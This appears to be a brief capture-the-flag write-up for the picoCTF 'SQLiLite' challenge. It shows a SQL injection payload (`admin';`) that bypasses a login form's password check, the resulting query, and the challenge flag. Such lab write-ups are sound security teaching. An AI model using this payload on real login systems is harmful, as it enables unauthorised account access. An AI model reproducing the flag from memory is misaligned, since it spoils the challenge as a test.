# **_SQLiLite_**
## Description
>Can you login to this website?

## Solution
Visit the site, a login form is shown, try login as `admin` with `sql injection`
Enter `admin';` as user, so the query becomes
>SELECT * FROM users WHERE name='admin';' AND password='a'

Which login as `admin` but without password check
The flag is't shown in the page so we have to look at the html code to get the flag
>picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}